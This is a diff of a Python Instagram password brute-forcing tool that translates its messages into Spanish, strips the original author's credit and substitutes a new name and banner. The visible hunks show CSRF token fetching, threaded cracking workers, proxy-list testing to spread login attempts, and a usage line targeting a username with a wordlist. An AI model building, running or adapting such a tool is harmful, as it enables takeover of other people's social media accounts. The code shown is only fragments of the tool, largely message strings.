@@ -1,8 +1,7 @@
 # coding=utf-8
 ###############################################################################
-# Instagram Brute Forcer
-# Developed By N3TC@T
-# netcat[dot]av[at]gmail[dot]com 
+# Instagram Fuerza Bruta
+# Desarrollo Cyb3rMeth0d 
 # !/usr/bin/python
 ###############################################################################
 from __future__ import print_function
@@ -83,7 +82,7 @@ def get_csrf():
     """
     global csrf_token
 
-    print(bcolors.WARNING + "[+] Getting CSRF Token: " + bcolors.ENDC)
+    print(bcolors.WARNING + "[+] Obteniendo CSRF Token: " + bcolors.ENDC)
 
     try:
         opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
@@ -209,10 +208,10 @@ def brute(q):
 
         except Exception as err:
             if _debug:
-                print(bcolors.FAIL + "[!] Unknown Error in request." + bcolors.ENDC)
+                print(bcolors.FAIL + "[!] Error desconocido en la solicitud" + bcolors.ENDC)
                 logger.error(err)
             else:
-                print(bcolors.FAIL + "[!] Unknown Error in request, please turn on debug mode with -d" + bcolors.ENDC)
+                print(bcolors.FAIL + "[!] Error desconocido en la solicitud, por favor utiliza el modo debug usando -d" + bcolors.ENDC)
 
             pass
             return
@@ -231,8 +230,8 @@ def starter():
 
     queuelock = threading.Lock()
 
-    print(bcolors.HEADER + "\n[!] Initializing Workers")
-    print("[!] Start Cracking ... \n" + bcolors.ENDC)
+    print(bcolors.HEADER + "\n[!] Iniciando Trabajos")
+    print("[!] Iniciando Crackeo ... \n" + bcolors.ENDC)
 
     try:
         for word in words:
@@ -250,7 +249,7 @@ def starter():
             if found_flag:
                 break
         print(bcolors.OKGREEN + "\n--------------------")
-        print("[!] Brute complete !" + bcolors.ENDC)
+        print("[!] Fuerza Bruta Completado !" + bcolors.ENDC)
 
     except Exception as err:
         print(err)
@@ -263,7 +262,7 @@ def check_avalaible_proxys(proxys):
     socket.setdefaulttimeout(30)
 
     global proxys_working_list
-    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)
+    print(bcolors.WARNING + "[-] Test Lista Proxy...\n" + bcolors.ENDC)
 
     proxys_working_list = {}
     max_thread = THREAD
@@ -286,14 +285,14 @@ def check_avalaible_proxys(proxys):
             t.join()
         queuelock.release()
 
-    print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")
+    print(bcolors.OKGREEN + "[+] Proxy Funcionando: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")
 
 
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(
-        description="Instagram BruteForcer",
-        epilog="./instabrute -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
+        description="Fuerza-Bruta",
+        epilog="./Fuerza-Bruta -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
     )
 
     # required argument
@@ -343,24 +342,22 @@ if __name__ == "__main__":
                             format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
         logger = logging.getLogger(__name__)
 
-    print(bcolors.HEADER + """.-------------------------------------------------------.""")
-    print("""| |\___/|       ___           _                         |""")
-    print("""| )     (      |_ _|_ __  ___| |_ __ _                  |""")
-    print("""|=\     /=      | || '_ \/ __| __/ _` |                 |""")
-    print("""|  )===(        | || | | \__ \ || (_| |                 |""")
-    print("""| /     \      |___|_| |_|___/\__\__,_|                 |""")
-    print("""| |     |                                               |""")
-    print("""|/       \           _     ____  _   _ _____ _____      |""")
-    print("""|\       /          | |__ |  _ \| | | |_   _| ____|     |""")
-    print("""| \__  _/           | '_ \| |_) | | | | | | |  _|       |""")
-    print("""|   ( (             | |_) |  _ <| |_| | | | | |___      |""")
-    print("""|    ) )            |_.__/|_| \_\_____/ |_| |_____|     |""")
-    print("""|   (_(                                                 |""")
-    print("""'-------------------------------------------------------'""")
+    print(bcolors.HEADER + """.---------------------------------------------------------------------.""")
+    print("""|                                                                     |""")
+    print("""|                            ......                                   |""")
+    print("""|                        .:||||||||:.                                 |""")
+    print("""|                       /            \                                |""")
+    print("""|                      (   o      o   )                               |""")
+    print("""|            --@@@@----------:  :----------@@@@--                     |""")
+    print("""|                      Cyb3rMeth0d V1                                 |""")
+    print("""|                                                                     |""")
+    print("""|       ___       ___  __  __          __   __       ___              |""")
+    print("""|      |__  |  | |__  |__)  /  /\     |__) |__) |  |  |   /\          |""")
+    print("""|      |    \__/ |___ |  \ /_ /~~\    |__) |  \ \__/  |  /~~\         |""")
 
-    print(bcolors.OKGREEN + "[+] Username Loaded:", bcolors.BOLD + USER + bcolors.ENDC)
-    print(bcolors.OKGREEN + "[+] Words Loaded:", bcolors.BOLD + str(len(words)) + bcolors.ENDC)
-    print(bcolors.OKGREEN + "[+] Proxy Loaded:", bcolors.BOLD + str(len(proxys)) + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Usuario Cargado:", bcolors.BOLD + USER + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Contrseñas Cargadas:", bcolors.BOLD + str(len(words)) + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Proxy Cargados:", bcolors.BOLD + str(len(proxys)) + bcolors.ENDC)
     print(bcolors.ENDC)
 
     check_avalaible_proxys(proxys)
